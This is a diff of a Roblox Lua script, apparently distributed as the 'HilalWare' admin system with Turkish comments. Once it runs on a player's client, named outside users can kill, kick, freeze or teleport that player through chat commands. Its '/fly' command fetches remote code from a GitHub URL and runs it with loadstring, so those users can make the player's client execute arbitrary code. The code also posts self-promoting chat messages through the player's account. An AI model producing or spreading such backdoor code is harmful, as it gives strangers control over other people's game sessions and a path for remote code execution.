@@ -1,56 +1,9 @@
--- Sistem işaretleyicisi: Script'in tekrar çalışmasını engeller
-local markerName = "ServerSecAdminV3"
+--admin sistem fly/bring/kill/kick
 
-if game:GetService("ReplicatedStorage"):FindFirstChild(markerName) then
-    warn("Admin Script zaten çalışıyor, ikinci kez başlatılmayacak.")
-    return
-end
-
-local marker = Instance.new("BoolValue")
-marker.Name = markerName
-marker.Parent = game:GetService("ReplicatedStorage")
-
--- Servisler
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TextChatService = game:GetService("TextChatService")
-local StarterGui = game:GetService("StarterGui")
-
 local LocalPlayer = Players.LocalPlayer
 
--- Kara liste: Bu oyuncular scripti kullanamaz
-local blacklistedPlayers = {
-    "Anar1234558",
-    "makan0000",
-    "sisiysieosisusjs",
-    "ReVeD961",
-    "sad53119",
-    "Bob207362",
-    "kakos_8881",
-    "NOBUU8625",
-    "bool_anget",
-    "Kayrabjk010203",
-    "AervanixVX"
-}
-
--- Oyuncu kara listede mi kontrol et
-if table.find(blacklistedPlayers, LocalPlayer.Name) then
-    LocalPlayer:Kick("Bu admin sistemini kullanmak için kara listedesiniz.")
-    return
-end
-
--- Sistem mesajı
-pcall(function()
-    StarterGui:SetCore("ChatMakeSystemMessage", {
-        Text = "HilalWare.Lua System2 v39+3 tarafından",
-        Color = Color3.fromRGB(255, 0, 0),
-        Font = Enum.Font.GothamBold,
-        TextSize = 18
-    })
-end)
-
--- Yetkili kullanıcılar
+-- Yetkililer
 local allowedUsers = {
     ["q692q"] = true,
     ["muhammet_bekir2004"] = true,
@@ -59,33 +12,38 @@ local allowedUsers = {
 }
 
 local frozen = false
-local loopBring = false
-local loopTarget = nil
-local loopKill = false
-local loopKillConnection = nil
 
--- Mesaj gönderme fonksiyonu
-local function sayMessage(msg)
-    if msg == "" then return end
+-- Yönetici etiketi
+local function addAdminTag(player)
+    local function onCharacterAdded(character)
+        local head = character:WaitForChild("Head", 5)
+        if head then
+            local billboard = Instance.new("BillboardGui")
+            billboard.Size = UDim2.new(0, 200, 0, 50)
+            billboard.StudsOffset = Vector3.new(0, 2, 0)
+            billboard.Adornee = head
+            billboard.AlwaysOnTop = true
+            billboard.Parent = head
 
-    -- Yeni sohbet sistemi
-    if TextChatService.DefaultChannel then
-        local success, err = pcall(function()
-            TextChatService:Chat(LocalPlayer.Character.Head, msg, Enum.ChatColor.Red)
-        end)
-        if not success then warn("Hata: " .. err) end
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Size = UDim2.new(1, 0, 1, 0)
+            textLabel.BackgroundTransparency = 1
+            textLabel.Text = "Yönetici"
+            textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+            textLabel.TextStrokeTransparency = 0
+            textLabel.TextScaled = true
+            textLabel.Font = Enum.Font.GothamBold
+            textLabel.Parent = billboard
+        end
     end
 
-    -- Eski sohbet sistemi
-    if ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
-        local success, err = pcall(function()
-            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
-        end)
-        if not success then warn("Hata: " .. err) end
+    player.CharacterAdded:Connect(onCharacterAdded)
+    if player.Character then
+        onCharacterAdded(player.Character)
     end
 end
 
--- Karakteri dondur/çöz
+-- Karakterin tüm parçalarını dondur / çöz
 local function setAnchoredAllParts(char, anchored)
     for _, part in ipairs(char:GetDescendants()) do
         if part:IsA("BasePart") then
@@ -94,154 +52,75 @@ local function setAnchoredAllParts(char, anchored)
     end
 end
 
--- LoopKill fonksiyonu
-local function startLoopKill()
-    if loopKillConnection then
-        loopKillConnection:Disconnect()
-        loopKillConnection = nil
-    end
-    
-    loopKillConnection = RunService.Heartbeat:Connect(function()
-        if not loopKill then return end
-        
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and not allowedUsers[player.Name] then
-                if player.Character and player.Character:FindFirstChild("Humanoid") then
-                    -- İnsancıl bir şekilde öldürme
-                    local humanoid = player.Character.Humanoid
-                    humanoid:TakeDamage(humanoid.Health)
-                end
-            end
-        end
-    end)
+-- Chat mesajı gönder
+local function sendHilalWareMessage()
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("By HilalWare.Lua New Scripts", "All")
 end
 
--- LoopBring fonksiyonu
-local function startLoopBring()
-    if loopBring and loopTarget and loopTarget.Character and 
-       loopTarget.Character:FindFirstChild("HumanoidRootPart") and 
-       LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        LocalPlayer.Character.HumanoidRootPart.CFrame = loopTarget.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
-    end
-end
-
--- LoopBring için Heartbeat bağlantısı
-RunService.Heartbeat:Connect(startLoopBring)
-
--- Komut işleyici
+-- Komutlar
 local function setupCommands(player)
     player.Chatted:Connect(function(message)
-        -- Sadece yetkili kullanıcılar komutları kullanabilir
-        if not allowedUsers[player.Name] then return end
-        
-        local args = string.split(message, " ")
-        local command = args[1]:lower()
-        table.remove(args, 1)
-        local params = table.concat(args, " ")
+        message = string.lower(message)
 
-        if command == "/kill" then
-            -- Kendini öldür
+        -- Sadece adminler komut çalıştırabilir
+        if not allowedUsers[player.Name] then
+            return
+        end
+
+        if message == "/kill" then
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                 LocalPlayer.Character.Humanoid.Health = 0
+                sendHilalWareMessage()
             end
 
-        elseif command == "/kick" then
-            -- Kendini at
-            LocalPlayer:Kick(params ~= "" and params or "Yönetici tarafından atıldınız")
+        elseif message == "/kick" then
+            LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
+            sendHilalWareMessage()
 
-        elseif command == "/freeze" then
-            -- Don
+        elseif message == "/freeze" then
             if LocalPlayer.Character then
                 frozen = true
                 setAnchoredAllParts(LocalPlayer.Character, true)
+                sendHilalWareMessage()
             end
 
-        elseif command == "/unfreeze" then
-            -- Donmayı kaldır
+        elseif message == "/unfreeze" then
             if LocalPlayer.Character then
                 frozen = false
                 setAnchoredAllParts(LocalPlayer.Character, false)
+                sendHilalWareMessage()
             end
 
-        elseif command == "/bring" then
-            -- Yetkiliye git
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and 
-               player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        elseif message == "/bring" then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") 
+                and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                 LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                sendHilalWareMessage()
             end
 
-        elseif command == "/loopbring" then
-            -- Sürekli yetkiliyi takip et
-            loopBring = true
-            loopTarget = player
-            warn("LoopBring aktif: " .. player.Name .. " takip ediliyor")
-
-        elseif command == "/unloopbring" then
-            -- Takibi durdur
-            loopBring = false
-            loopTarget = nil
-            warn("LoopBring durduruldu")
-
-        elseif command == "/fly" then
-            -- Uçma scripti
+        elseif message == "/fly" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly"))()
+            sendHilalWareMessage()
 
-        elseif command == "/antifling" then
-            -- Fling koruması
-            local function makeNoCollide(character)
-                for _, part in ipairs(character:GetDescendants()) do
-                    if part:IsA("BasePart") then
-                        part.CanCollide = false
-                    end
-                end
+        elseif message == "/unfly" then
+            if _G.FlyFunction and typeof(_G.FlyFunction) == "function" then
+                _G.FlyFunction(false)
+                sendHilalWareMessage()
             end
-
-            local function onPlayerAdded(plr)
-                plr.CharacterAdded:Connect(function(character)
-                    makeNoCollide(character)
-                end)
-            end
-
-            for _, p in ipairs(Players:GetPlayers()) do
-                onPlayerAdded(p)
-                if p.Character then
-                    makeNoCollide(p.Character)
-                end
-            end
-
-            Players.PlayerAdded:Connect(onPlayerAdded)
-
-        elseif command == "/loopkill" then
-            -- Herkesi sürekli öldür
-            loopKill = true
-            startLoopKill()
-            warn("LoopKill aktif: Tüm oyuncular öldürülüyor")
-
-        elseif command == "/unloopkill" then
-            -- Sürekli öldürmeyi durdur
-            loopKill = false
-            if loopKillConnection then
-                loopKillConnection:Disconnect()
-                loopKillConnection = nil
-            end
-            warn("LoopKill durduruldu")
-
-        elseif command == "/say" then
-            -- Mesaj gönder
-            sayMessage(params)
         end
     end)
-end
-
--- Mevcut ve yeni oyuncular için komutları ayarla
-for _, player in ipairs(Players:GetPlayers()) do
-    if allowedUsers[player.Name] then
-        setupCommands(player)
-    end
 end
 
 Players.PlayerAdded:Connect(function(player)
     if allowedUsers[player.Name] then
+        addAdminTag(player)
         setupCommands(player)
     end
 end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if allowedUsers[player.Name] then
+        addAdminTag(player)
+        setupCommands(player)
+    end
+end
